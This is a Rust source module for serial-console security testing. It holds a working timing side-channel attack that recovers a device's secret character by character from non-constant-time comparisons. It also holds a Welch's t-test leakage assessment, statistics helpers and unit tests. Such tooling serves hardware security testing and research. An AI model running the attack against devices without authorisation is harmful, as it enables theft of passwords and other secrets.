//! Timing side-channel analysis over a serial console.
//!
//!  - `timing-attack`: recover a secret char-by-char when the device compares
//!    it with a non-constant-time check (early-exit `strcmp`). The correct
//!    character at each position takes measurably longer to reject.
//!  - `leakage-test`: a TVLA-lite check that statistically decides whether two
//!    input classes produce distinguishable response timing (Welch's t-test).
//!
//! Constraint: the per-character delay must exceed UART jitter. Use many
//! samples; medians and the t-test handle the noise. Works against slow or
//! artificially delayed checks, not microsecond-fast ones without a lot of
//! averaging.

use std::error::Error;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

use colored::*;

use crate::session::Session;

/// Summary statistics for a sample set (microseconds).
#[derive(Debug, Clone, Copy, Default)]
pub struct Stats {
    pub n: usize,
    pub mean: f64,
    pub median: f64,
    pub stddev: f64,
    pub min: f64,
    pub max: f64,
}

pub fn stats(xs: &[f64]) -> Stats {
    let n = xs.len();
    if n == 0 {
        return Stats::default();
    }
    let mean = xs.iter().sum::<f64>() / n as f64;
    let variance = if n > 1 {
        xs.iter().map(|x| (x - mean).powi(2)).sum::<f64>() / (n as f64 - 1.0)
    } else {
        0.0
    };
    let mut sorted = xs.to_vec();
    sorted.sort_by(|a, b| a.partial_cmp(b).unwrap_or(std::cmp::Ordering::Equal));
    let median = if n % 2 == 1 {
        sorted[n / 2]
    } else {
        (sorted[n / 2 - 1] + sorted[n / 2]) / 2.0
    };
    Stats {
        n,
        mean,
        median,
        stddev: variance.sqrt(),
        min: sorted[0],
        max: sorted[n - 1],
    }
}

/// Welch's t-statistic between two samples. Large magnitude means the two
/// timing distributions are distinguishable.
pub fn welch_t(a: &[f64], b: &[f64]) -> f64 {
    let sa = stats(a);
    let sb = stats(b);
    if sa.n == 0 || sb.n == 0 {
        return 0.0;
    }
    let denom = (sa.stddev.powi(2) / sa.n as f64 + sb.stddev.powi(2) / sb.n as f64).sqrt();
    if denom == 0.0 {
        return 0.0;
    }
    (sa.mean - sb.mean) / denom
}

/// Index of the value that stands out above the rest by more than `z` standard
/// deviations of the others. None if no value is a clear outlier.
pub fn pick_outlier(values: &[f64], z: f64) -> Option<usize> {
    if values.len() < 2 {
        return None;
    }
    let max_i = values
        .iter()
        .enumerate()
        .max_by(|a, b| a.1.partial_cmp(b.1).unwrap_or(std::cmp::Ordering::Equal))
        .map(|(i, _)| i)?;
    let max_v = values[max_i];
    let others: Vec<f64> = values
        .iter()
        .enumerate()
        .filter(|(i, _)| *i != max_i)
        .map(|(_, &v)| v)
        .collect();
    let om = others.iter().sum::<f64>() / others.len() as f64;
    let osd = (others.iter().map(|x| (x - om).powi(2)).sum::<f64>() / others.len() as f64).sqrt();
    let sep = if osd > 0.0 {
        (max_v - om) / osd
    } else if max_v > om {
        f64::INFINITY
    } else {
        0.0
    };
    if sep > z {
        Some(max_i)
    } else {
        None
    }
}

/// Send `input` as a line and time how long until `marker` appears. Returns
/// microseconds, or None on timeout.
fn measure_response(
    s: &mut Session,
    input: &str,
    marker: &str,
    timeout: Duration,
) -> Option<f64> {
    let _ = s.send_line(input);
    let start = Instant::now();
    let pats = [marker.to_string()];
    s.expect(&pats, timeout)
        .map(|_| start.elapsed().as_secs_f64() * 1e6)
}

pub struct TimingOpts {
    pub charset: Vec<u8>,
    pub max_len: usize,
    pub samples: usize,
    pub marker: String,
    pub prefix: String,
    pub z: f64,
    pub settle: Duration,
}

/// Recover a secret one character at a time by timing the console's rejection.
pub fn timing_attack(
    port: &str,
    baud: u32,
    opts: &TimingOpts,
    running: Arc<AtomicBool>,
) -> Result<String, Box<dyn Error>> {
    println!("\n{}", "=== TIMING SIDE-CHANNEL ATTACK ===".bold().magenta());
    println!(
        "{} {} @ {} baud  charset={} samples={} marker={:?}",
        "Target:".cyan(),
        port,
        baud,
        opts.charset.len(),
        opts.samples,
        opts.marker
    );
    let mut s = Session::open(port, baud, running.clone())?;
    s.echo = false;
    s.collect(Duration::from_millis(300));
    let mut recovered = String::new();
    let timeout = Duration::from_secs(3);

    'pos: for pos in 0..opts.max_len {
        if !running.load(Ordering::SeqCst) {
            break;
        }
        let mut medians = Vec::with_capacity(opts.charset.len());
        for &c in &opts.charset {
            let guess = format!("{}{}{}", opts.prefix, recovered, c as char);
            let mut times = Vec::with_capacity(opts.samples);
            for _ in 0..opts.samples {
                if !running.load(Ordering::SeqCst) {
                    break 'pos;
                }
                if let Some(t) = measure_response(&mut s, &guess, &opts.marker, timeout) {
                    times.push(t);
                }
                if !opts.settle.is_zero() {
                    s.collect(opts.settle);
                }
            }
            medians.push(if times.is_empty() { 0.0 } else { stats(&times).median });
        }
        match pick_outlier(&medians, opts.z) {
            Some(i) => {
                let ch = opts.charset[i] as char;
                recovered.push(ch);
                println!(
                    "{} position {}: {:?}  (median {:.0} us)",
                    "[+]".bold().green(),
                    pos,
                    ch,
                    medians[i]
                );
            }
            None => {
                println!(
                    "{} no timing signal at position {}; stopping",
                    "[*]".yellow(),
                    pos
                );
                break;
            }
        }
    }
    println!("{} recovered: {:?}", "[+]".bold().green(), recovered);
    Ok(recovered)
}

/// TVLA-lite: decide whether two input classes have distinguishable timing.
pub fn leakage_test(
    port: &str,
    baud: u32,
    class_a: &str,
    class_b: &str,
    samples: usize,
    marker: &str,
    running: Arc<AtomicBool>,
) -> Result<f64, Box<dyn Error>> {
    println!("\n{}", "=== TIMING LEAKAGE ASSESSMENT ===".bold().magenta());
    let mut s = Session::open(port, baud, running.clone())?;
    s.echo = false;
    s.collect(Duration::from_millis(300));
    let timeout = Duration::from_secs(3);
    let (mut ta, mut tb) = (Vec::new(), Vec::new());
    for _ in 0..samples {
        if !running.load(Ordering::SeqCst) {
            break;
        }
        if let Some(t) = measure_response(&mut s, class_a, marker, timeout) {
            ta.push(t);
        }
        s.collect(Duration::from_millis(20));
        if let Some(t) = measure_response(&mut s, class_b, marker, timeout) {
            tb.push(t);
        }
        s.collect(Duration::from_millis(20));
    }
    let t = welch_t(&ta, &tb);
    let sa = stats(&ta);
    let sb = stats(&tb);
    println!(
        "  class A: median {:.0} us, range [{:.0}, {:.0}] (n={})",
        sa.median, sa.min, sa.max, sa.n
    );
    println!(
        "  class B: median {:.0} us, range [{:.0}, {:.0}] (n={})",
        sb.median, sb.min, sb.max, sb.n
    );
    if t.abs() > 4.5 {
        println!(
            "{} timing leak detected: |t| = {:.1} (> 4.5 TVLA threshold)",
            "[!]".bold().red(),
            t.abs()
        );
    } else {
        println!(
            "{} no significant timing difference: |t| = {:.1}",
            "[+]".green(),
            t.abs()
        );
    }
    Ok(t)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn stats_basic() {
        let s = stats(&[2., 4., 4., 4., 5., 5., 7., 9.]);
        assert!((s.mean - 5.0).abs() < 1e-9);
        assert!((s.stddev - 2.138).abs() < 0.01);
        assert_eq!(s.median, 4.5);
        assert_eq!(s.min, 2.0);
        assert_eq!(s.max, 9.0);
    }

    #[test]
    fn welch_distinguishes() {
        assert!(welch_t(&[10., 11., 12.], &[1., 2., 3.]) > 8.0);
        assert!(welch_t(&[5., 5., 5.], &[5., 5., 5.]).abs() < 1e-9);
    }

    #[test]
    fn outlier_detection() {
        assert_eq!(pick_outlier(&[1., 1., 1., 5., 1.], 3.0), Some(3));
        assert_eq!(pick_outlier(&[1., 1., 1., 1., 1.], 3.0), None);
        // a small bump inside the noise band is not a signal
        assert_eq!(pick_outlier(&[10., 10.5, 9.5, 10.2, 9.8], 5.0), None);
    }
}
